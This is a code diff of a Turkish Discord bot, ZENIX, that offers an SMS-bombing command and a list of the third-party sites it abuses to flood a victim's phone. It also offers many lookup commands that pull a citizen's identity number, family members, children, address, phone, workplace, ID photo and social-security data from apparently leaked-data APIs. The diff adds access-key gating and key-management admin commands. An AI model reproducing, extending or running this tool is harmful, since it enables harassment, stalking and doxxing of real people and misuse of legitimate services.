+    full = "\n".join(lines)
 
-    embed = discord.Embed(
-        title="🚀 ZENIX SMS BOMBER - TURBO MOD",
+    embed = discord.Embed(title="🚀 ZENIX SMS BOMBER - TURBO",
         description=f"📱 `{numara}` | 🔁 {adet} tur | ⏱️ {elapsed}s",
-        color=COLOR_OK,
-        timestamp=datetime.datetime.utcnow()
-    )
+        color=COLOR_OK, timestamp=datetime.datetime.utcnow())
     embed.add_field(name="📊 Özet", value=f"✅ Başarılı: **{ok}**\n❌ Başarısız: **{fail}**", inline=False)
     embed.set_thumbnail(url=LOGO_URL)
 
-    full = "\n".join(lines)
     if len(full) > 1000:
-        full = full[:1000] + "\n... (devamı dosyada)"
-        file = discord.File(io.BytesIO("\n".join(lines).encode("utf-8")), filename="zenix_turbo_log.txt")
+        file = discord.File(io.BytesIO(full.encode("utf-8")), filename="zenix_turbo.txt")
         await msg.edit(embed=embed)
         await interaction.followup.send(file=file)
     else:
-        embed.add_field(name="🔍 Servis Detayı", value=full or "Sonuç yok", inline=False)
+        embed.add_field(name="🔍 Detay", value=full or "Sonuç yok", inline=False)
         await msg.edit(embed=embed)
 
 
-# ==================== SERVİS LİSTESİ ====================
 @zenix_group.command(name="servisler", description="SMS Bomber yüklü servisler")
 async def z_servisler(interaction: discord.Interaction):
+    if not await precheck(interaction): return
     services = [
         "kahvedunyasi.com", "wmf.com.tr", "bim.veesk.net", "englishhome.com",
         "suiste.com", "kimgb", "evidea.com", "345dijital.com", "tiklagelsin.com",
@@ -847,14 +1151,11 @@ async def z_servisler(interaction: discord.Interaction):
         "hamidiye.istanbul", "money.com.tr", "alixavien.com.tr",
         "jimmykey.com", "ido.com.tr"
     ]
-    embed = discord.Embed(
-        title="📋 ZENIX SMS BOMBER - Servis Listesi",
-        description=f"Toplam **{len(services)}** servis yüklü.",
-        color=COLOR_Z
-    )
+    embed = discord.Embed(title="📋 ZENIX SMS BOMBER - Servisler",
+        description=f"Toplam **{len(services)}** servis.", color=COLOR_Z)
     half = len(services) // 2
-    embed.add_field(name="Servisler (1)", value="\n".join(f"• `{s}`" for s in services[:half]), inline=True)
-    embed.add_field(name="Servisler (2)", value="\n".join(f"• `{s}`" for s in services[half:]), inline=True)
+    embed.add_field(name="(1)", value="\n".join(f"• `{s}`" for s in services[:half]), inline=True)
+    embed.add_field(name="(2)", value="\n".join(f"• `{s}`" for s in services[half:]), inline=True)
     embed.set_thumbnail(url=LOGO_URL)
     await interaction.response.send_message(embed=embed)
 
@@ -863,6 +1164,7 @@ async def z_servisler(interaction: discord.Interaction):
 @zenix2_group.command(name="tc", description="TC kimlik sorgusu")
 @app_commands.describe(tc="TC")
 async def z2_tc(interaction: discord.Interaction, tc: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{SOLIDARK}/tc.php?tc={tc}")
     if clean_data(data) is None:
@@ -873,6 +1175,7 @@ async def z2_tc(interaction: discord.Interaction, tc: str):
 @zenix2_group.command(name="tcpro", description="TC Pro detaylı sorgu")
 @app_commands.describe(tc="TC")
 async def z2_tcpro(interaction: discord.Interaction, tc: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{SOLIDARK}/tcpro.php?tc={tc}")
     if clean_data(data) is None:
@@ -883,6 +1186,7 @@ async def z2_tcpro(interaction: discord.Interaction, tc: str):
 @zenix2_group.command(name="aile", description="Aile sorgusu")
 @app_commands.describe(tc="TC")
 async def z2_aile(interaction: discord.Interaction, tc: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{SEARCHULP}/aile/{tc}?key={SEARCH_KEY}")
     await send_result(interaction, data)
@@ -891,6 +1195,7 @@ async def z2_aile(interaction: discord.Interaction, tc: str):
 @zenix2_group.command(name="ailepro", description="Aile Pro sorgusu")
 @app_commands.describe(tc="TC")
 async def z2_ailepro(interaction: discord.Interaction, tc: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{SOLIDARK}/ailepro.php?tc={tc}")
     await send_result(interaction, data)
@@ -899,6 +1204,7 @@ async def z2_ailepro(interaction: discord.Interaction, tc: str):
 @zenix2_group.command(name="sulale", description="Sülale sorgusu")
 @app_commands.describe(tc="TC")
 async def z2_sulale(interaction: discord.Interaction, tc: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{SEARCHULP}/sulale/{tc}?key={SEARCH_KEY}")
     await send_result(interaction, data)
@@ -907,6 +1213,7 @@ async def z2_sulale(interaction: discord.Interaction, tc: str):
 @zenix2_group.command(name="cocuk", description="Çocuk sorgusu")
 @app_commands.describe(tc="TC")
 async def z2_cocuk(interaction: discord.Interaction, tc: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{SEARCHULP}/cocuk/{tc}?key={SEARCH_KEY}")
     await send_result(interaction, data)
@@ -915,6 +1222,7 @@ async def z2_cocuk(interaction: discord.Interaction, tc: str):
 @zenix2_group.command(name="adres", description="Adres sorgusu")
 @app_commands.describe(tc="TC")
 async def z2_adres(interaction: discord.Interaction, tc: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{SEARCHULP}/adres/{tc}?key={SEARCH_KEY}")
     await send_result(interaction, data)
@@ -923,6 +1231,7 @@ async def z2_adres(interaction: discord.Interaction, tc: str):
 @zenix2_group.command(name="gsmtc", description="GSM → TC sorgusu")
 @app_commands.describe(gsm="GSM")
 async def z2_gsmtc(interaction: discord.Interaction, gsm: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{SEARCHULP}/gsmtc/{gsm}?key={SEARCH_KEY}")
     await send_result(interaction, data)
@@ -931,6 +1240,7 @@ async def z2_gsmtc(interaction: discord.Interaction, gsm: str):
 @zenix2_group.command(name="tcgsm", description="TC → GSM sorgusu")
 @app_commands.describe(tc="TC")
 async def z2_tcgsm(interaction: discord.Interaction, tc: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{SEARCHULP}/tcgsm/{tc}?key={SEARCH_KEY}")
     await send_result(interaction, data)
@@ -939,6 +1249,7 @@ async def z2_tcgsm(interaction: discord.Interaction, tc: str):
 @zenix2_group.command(name="isyeri", description="İşyeri sorgusu")
 @app_commands.describe(tc="TC")
 async def z2_isyeri(interaction: discord.Interaction, tc: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{SEARCHULP}/isyeri/{tc}?key={SEARCH_KEY}")
     await send_result(interaction, data)
@@ -947,6 +1258,7 @@ async def z2_isyeri(interaction: discord.Interaction, tc: str):
 @zenix2_group.command(name="vesika", description="Vesika sorgusu")
 @app_commands.describe(tc="TC")
 async def z2_vesika(interaction: discord.Interaction, tc: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{SOLIDARK}/vesika.php?tc={tc}")
     await send_result(interaction, data)
@@ -955,6 +1267,7 @@ async def z2_vesika(interaction: discord.Interaction, tc: str):
 @zenix2_group.command(name="sgk", description="SGK sorgusu")
 @app_commands.describe(tc="TC")
 async def z2_sgk(interaction: discord.Interaction, tc: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{SOLIDARK}/sgk.php?tc={tc}")
     await send_result(interaction, data)
@@ -963,6 +1276,7 @@ async def z2_sgk(interaction: discord.Interaction, tc: str):
 @zenix2_group.command(name="idsorgu", description="ID ile e-posta/log sorgusu")
 @app_commands.describe(id="ID (örn: 92433932011724800)")
 async def z2_idsorgu(interaction: discord.Interaction, id: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{ID_API}?id={id}")
     await send_result(interaction, data)
@@ -972,6 +1286,7 @@ async def z2_idsorgu(interaction: discord.Interaction, id: str):
 @zenix3_group.command(name="adsoyad", description="Ad soyad arama")
 @app_commands.describe(ad="Ad", soyad="Soyad", il="İl", ilce="İlçe", dogumtarihi="Doğum tarihi")
 async def z3_adsoyad(interaction: discord.Interaction, ad: str, soyad: Optional[str] = None, il: Optional[str] = None, ilce: Optional[str] = None, dogumtarihi: Optional[str] = None):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     params = {"ad": ad, "key": SEARCH_KEY}
     if soyad:        params["soyad"] = soyad
@@ -985,6 +1300,7 @@ async def z3_adsoyad(interaction: discord.Interaction, ad: str, soyad: Optional[
 @zenix3_group.command(name="adsoyadil", description="Ad soyad il ilçe sorgusu")
 @app_commands.describe(ad="Ad", soyad="Soyad", il="İl", ilce="İlçe")
 async def z3_adsoyadil(interaction: discord.Interaction, ad: str, soyad: str, il: str, ilce: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{SOLIDARK}/adsoyad.php?ad={ad}&soyad={soyad}&il={il}&ilce={ilce}")
     await send_result(interaction, data)
@@ -993,12 +1309,13 @@ async def z3_adsoyadil(interaction: discord.Interaction, ad: str, soyad: str, il
 @zenix3_group.command(name="adililce", description="Ad il ilçe sorgusu")
 @app_commands.describe(ad="Ad", il="İl", ilce="İlçe")
 async def z3_adililce(interaction: discord.Interaction, ad: str, il: str, ilce: str):
+    if not await precheck(interaction): return
     await interaction.response.defer()
     data = await fetch_json(f"{SOLIDARK}/adililce.php?ad={ad}&il={il}&ilce={ilce}")
     await send_result(interaction, data)
 
 
-# ==================== GENEL ====================
+# ==================== GENEL (ANAHTARSIZ) ====================
 @bot.tree.command(name="ping", description="Bot gecikmesi")
 async def ping(interaction: discord.Interaction):
     await interaction.response.send_message(f"```\n{round(bot.latency * 1000)}ms\n```")
@@ -1006,6 +1323,11 @@ async def ping(interaction: discord.Interaction):
 
 @bot.tree.command(name="yardim", description="ZENIX komutları")
 async def yardim(interaction: discord.Interaction):
+    # DM'de gösterme
+    if interaction.guild is None:
+        await interaction.response.send_message("❌ Sunucuda kullan.", ephemeral=True)
+        return
+
     g1 = [c.name for c in zenix_group.commands]
     g2 = [c.name for c in zenix2_group.commands]
     g3 = [c.name for c in zenix3_group.commands]
@@ -1019,13 +1341,8 @@ async def yardim(interaction: discord.Interaction):
     embed.add_field(name="⚡ `/zenix` — Genel & SMS", value="`" + "` `".join(sorted(g1)) + "`", inline=False)
     embed.add_field(name="🪪 `/zenix2` — TC & Kimlik", value="`" + "` `".join(sorted(g2)) + "`", inline=False)
     embed.add_field(name="👤 `/zenix3` — Ad/Soyad", value="`" + "` `".join(sorted(g3)) + "`", inline=False)
-    embed.add_field(
-        name="💣 SMS BOMBER KULLANIM",
-        value="`/zenix smsbomber numara:5XX adet:1 mail:x@y.com`\n"
-              "`/zenix turbo numara:5XX adet:1 mail:x@y.com`\n"
-              "`/zenix servisler`",
-        inline=False
-    )
+    embed.add_field(name="🔑 Anahtar", value="`/anahtargir`", inline=False)
+    embed.add_field(name="👑 Admin", value="`/anahtarolustur` `/anahtarsil` `/anahtarlistesi` `/sunucuekle` `/sunuculistesi` `/sunucusil`", inline=False)
     embed.set_thumbnail(url=LOGO_URL)
     embed.set_image(url=LOGO_URL)
     await interaction.response.send_message(embed=embed)
